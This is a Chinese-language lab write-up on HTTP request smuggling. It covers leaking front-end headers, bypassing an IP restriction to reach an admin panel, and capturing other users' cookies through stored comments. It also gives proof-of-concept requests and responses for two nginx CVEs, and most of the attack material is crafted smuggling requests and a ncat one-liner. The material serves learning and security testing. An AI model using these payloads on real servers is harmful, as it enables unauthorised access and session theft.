  * 把该POST请求中，找到的这个特殊的参数放在消息的最后面
  * 然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。
有时候 Front 服务器会给转发的请求添加一些请求头再转发给 Backend 服务器，我们可以利用 HTTP Smuggling 的方式来泄露这些请求头。
整个题目理解一下
这个题涉及前后端服务器，前端服务器不支持分块编码。
题目要求还是一样的，还是删除一个用户
进入靶场后发现多了个搜索框
随变输点东西抓包看一下
可以看到，请求方式是POST，底下出现了一个search栏，网页上也有回显，符合上文提到的条件：能够将请求参数的值输出到响应中的POST请求
尝试使用 HTTP Smuggling 方式访问，但是被不成功：
我们把search放在后面，看看可以输出什么
成功输出了，重写的字段显现出来了
下面分析一下原理
    POST / HTTP/1.1
    Content-Length: 99
    Content-Type: application/x-www-form-urlencoded
    search=123
看这个数据包，CL字段的值编辑为99，很显然345行的代码量绝对不足99，因此后端服务器在收到这个请求之后，会因为99而认为没有传输完毕，继续等待传输，然后我们继续发送数据包，后端收到的是前端处理好的请求，当接收的总长度到达99时，后端服务器来回认为这个请求传输完毕了，然后进行相应
那他收到的请求到底是什么样子的呢？
    POST / HTTP/1.1
    Content-Length: 99
    Content-Type: application/x-www-form-urlencoded
    search=123POST / HTTP/1.1
    X-vNEiJW-Ip: 60.208.116.230
    Host: 0af50032039935cac09024a000f90051.web
又因为search的结果会会回显，所以就得到了请求头
有人要问了：啊我直接添加`X-vNEiJW-Ip: 127.0.0.1`这个请求头不就行了吗？
那我们试试
可以发现并不会被识别，这是因为我们伪造的`X-vNEiJW-Ip`被服务器加上的`X-vNEiJW-Ip`覆盖掉了，我们可以利用上面提到的技巧，同样利用`Content-Length`将服务器加上的header给截断。
成功访问到admin
然后删除数据就行了
## 捕获其他用户的请求
题目要求是将请求走私到后端服务器，导致下一个用户的请求存储在应用程序中。然后检索下一个用户的请求并使用受害用户的 cookie 访问他们的帐户。
所以我们要找到一个可以保存法没回信息的功能点，然后通过smuggling等待用户访问，从而将用户的请求会现在功能点上。
发现它的评论是可以返会并保存且可见的
那我们直接构造一个smuggling请求
    Transfer-Encoding: chunked
    0
    POST /post/comment HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 600
    Cookie: session=KNcf39DxFk6mablQsC1OtaXSs1ryF37z
    csrf=zqKh3HpJ0bsKnWNIaPjMmPnjig4efP22&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
他的用户访问大概是两分钟一次吧。
回显是这样的
此时我已经发现有些不对了，这不是我的信息吗......不确定，再看看，这里发现最重要的cookie还没有出现，那就增大CL的长度，让回显更多一些
和我自己的cookie是一样的....
这抓半天抓到自己了，又重新做了几遍，结果都是抓的自己的cookie，应该是自己成为了在发包之后发评论的用户导致的，只能说这个靶场有些小问题，用户访问的太慢了，当我调大CL长度之后又直接报错了，就这样吧
原理是比较好理解的，和上个题目有些相似。
# 两个洞
## CVE-2019-20372
Nginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。
MITRE CVE 字典将此问题描述为：1.17.7 之前的 NGINX 具有某些 error_page 配置，允许 HTTP 请求走私，攻击者能够在
NGINX 由负载均衡器前端的环境中读取未经授权的网页
它不使用 error_page 进行 302 重定向。它仅使用 error_page 使用命名位置，即：`error_page 404
/404.html；`
`location = /40x.html { } error_page 500 502 503 504 /50x.html; location =
/50x.html { }`
构造请求头
    GET /test.html HTTP/1.1
    Host: www.0-sec.org
    Content-Length: 2
    GET /poc.html HTTP/1.1
    Host: www.0-sec.org
    Content-Length: 15
收到如下反应
    HTTP/1.1 200 OK
    Server: nginx/1.18.0
    Date: Fri, 01 May 2020 18:28:44 GMT
    Content-Type: text/html
    Content-Length: 33
    Last-Modified: Thu, 30 Apr 2020 14:36:32 GMT
    Connection: keep-alive
    ETag: "5eaae270-21"
    Accept-Ranges: bytes
    Test Page!
    HTTP/1.1 200 OK
    Server: nginx/1.18.0
    Date: Fri, 01 May 2020 18:28:44 GMT
    Content-Type: text/html
    Content-Length: 15
    Last-Modified: Thu, 30 Apr 2020 14:35:41 GMT
    Connection: keep-alive
    ETag: "5eaae23d-f"
    Accept-Ranges: bytes
    NGINX PoC File
这里看看v0w师傅是咋写的
    server {
     listen 80;
     server_name localhost;
     error_page 401 http://example.org;
     location / {
     return 401;
     }
    }
    server {
     listen 80;
     server_name notlocalhost;
     location /_hidden/index.html {
     return 200 'This should be hidden!';
     }
    }
这时候我们可以向服务器发送以下请求
    GET /a HTTP/1.1
    Host: localhost
    Content-Length: 56
    GET /_hidden/index.html HTTP/1.1
    Host: notlocalhost
看一下服务器是怎么处理的
    printf "GET /a HTTP/1.1\r\nHost: localhost\r\nContent-Length: 56\r\n\r\nGET
    /_hidden/index.html HTTP/1.1\r\nHost: notlocalhost\r\n\r\n" | ncat localhost 80 --noshutdown
等于说是吧两个请求都间接的执行了，我们看一下burp里面的返回值
    HTTP/1.1 302 Moved Temporarily
    Server: nginx/1.17.6
    Date: Fri, 06 Dec 2019 18:23:33 GMT
    Content-Type: text/html
    Content-Length: 145
    Connection: keep-alive
    Location: http://example.org
    302 Found
    302 Found
    nginx/1.17.6
    HTTP/1.1 200 OK
    Server: nginx/1.17.6
    Date: Fri, 06 Dec 2019 18:23:33 GMT
    Content-Type: text/html
    Content-Length: 22
    Connection: keep-alive
    This should be hidden!
## CVE-2020-12440
Nginx 1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。
构造请求
    GET /test.html HTTP/1.1
    Host: www.0-sec.org
    Content-Length: 2
    GET /poc.html HTTP/1.1
    Host: www.0-sec.org
    Content-Length: 15
回显
    HTTP/1.1 200 OK
    Server: nginx/1.18.0
    Date: Fri, 01 May 2020 18:28:44 GMT
    Content-Type: text/html
    Content-Length: 33
    Last-Modified: Thu, 30 Apr 2020 14:36:32 GMT
    Connection: keep-alive
    ETag: "5eaae270-21"
    Accept-Ranges: bytes
    Test Page!
    HTTP/1.1 200 OK
    Server: nginx/1.18.0
    Date: Fri, 01 May 2020 18:28:44 GMT
    Content-Type: text/html
    Content-Length: 15
    Last-Modified: Thu, 30 Apr 2020 14:35:41 GMT
    Connection: keep-alive
    ETag: "5eaae23d-f"
    Accept-Ranges: bytes
    NGINX PoC File
没有什么特别的配置
这里还是看了v0w师傅的解....网上关于这两个洞的分析太少了。
CL!=0的情况
利用方面只需要注意计算好CL即可。可以发现这里的两个请求都进行了处理
    GET /hello.html HTTP/1.1
    Host: 172.16.40.146
    Content-Length: 2
    GET /test.html HTTP/1.1
    Host: 172.16.40.146
    Content-Length: 2
这个payload亲测能解
    GET / HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 4
    Transfer-Encoding : chunked
    46
    GET /404 HTTP/1.1
    Host: 127.0.0.1
    Content-Length:15
    aa
    0s